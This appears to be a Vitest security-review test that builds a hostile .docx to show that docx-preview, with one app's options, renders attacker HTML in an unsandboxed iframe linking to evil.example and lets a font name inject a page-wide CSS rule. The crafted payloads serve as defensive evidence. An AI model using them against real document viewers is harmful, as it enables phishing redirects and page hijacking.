// @vitest-environment jsdom
/**
 * Review evidence: what docx-preview 0.4.0 puts into the page for a
 * hostile .docx when called with the options DocxView.tsx passes
 * (src/screens/viewer/DocxView.tsx renderAsync call). A pass confirms
 * the behaviour. jsdom does not load iframes or apply CSS, so these
 * tests prove what reaches the DOM, not the click itself.
 */

import { renderAsync } from "docx-preview";
import { strToU8, zipSync } from "fflate";
import { describe, expect, it } from "vitest";

const W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
const R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const REL = "http://schemas.openxmlformats.org/package/2006/relationships";

function hostileDocx(): Uint8Array {
	return zipSync({
		"[Content_Types].xml": strToU8(
			`<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="html" ContentType="text/html"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/></Types>`,
		),
		"_rels/.rels": strToU8(
			`<?xml version="1.0"?><Relationships xmlns="${REL}"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`,
		),
		"word/_rels/document.xml.rels": strToU8(
			`<?xml version="1.0"?><Relationships xmlns="${REL}"><Relationship Id="rIdChunk" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="chunk.html"/><Relationship Id="rIdStyles" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/></Relationships>`,
		),
		"word/chunk.html": strToU8(
			`<html><body><a id="escape" href="https://evil.example/" target="_top">Continue</a></body></html>`,
		),
		"word/styles.xml": strToU8(
			`<?xml version="1.0"?><w:styles xmlns:w="${W}"><w:style w:type="paragraph" w:styleId="Body"><w:name w:val="Body"/><w:rPr><w:rFonts w:ascii="x;}body{visibility:hidden}.z{"/></w:rPr></w:style></w:styles>`,
		),
		"word/document.xml": strToU8(
			`<?xml version="1.0"?><w:document xmlns:w="${W}" xmlns:r="${R}"><w:body><w:p><w:pPr><w:pStyle w:val="Body"/></w:pPr><w:r><w:t>Hello</w:t></w:r></w:p><w:altChunk r:id="rIdChunk"/></w:body></w:document>`,
		),
	});
}

async function renderLikeDocxView(): Promise<HTMLElement> {
	const staging = document.createElement("div");
	// The options DocxView.tsx passes (reading view off, comments off).
	await renderAsync(hostileDocx().slice(0), staging, staging, {
		inWrapper: true,
		breakPages: true,
		ignoreWidth: false,
		ignoreHeight: false,
		ignoreLastRenderedPageBreak: false,
		experimental: true,
		useBase64URL: true,
		renderComments: false,
	});
	return staging;
}

describe("docx-preview with DocxView's options (a pass confirms the finding)", () => {
	it("FINDING: an altChunk becomes an unsandboxed same-origin iframe with the attacker's HTML", async () => {
		const staging = await renderLikeDocxView();
		const frame = staging.querySelector("iframe");
		expect(frame).not.toBeNull();
		expect(frame?.hasAttribute("sandbox")).toBe(false);
		expect(frame?.srcdoc).toContain('target="_top"');
		expect(frame?.srcdoc).toContain("https://evil.example/");
	});

	it("FINDING: a font name breaks out of the generated stylesheet into a page-wide rule", async () => {
		const staging = await renderLikeDocxView();
		const css = [...staging.querySelectorAll("style")]
			.map((s) => s.textContent ?? "")
			.join("\n");
		expect(css).toContain("body{visibility:hidden}");
	});

	it("control: renderAltChunks: false drops the iframe", async () => {
		const staging = document.createElement("div");
		await renderAsync(hostileDocx().slice(0), staging, staging, {
			useBase64URL: true,
			renderAltChunks: false,
		});
		expect(staging.querySelector("iframe")).toBeNull();
	});
});
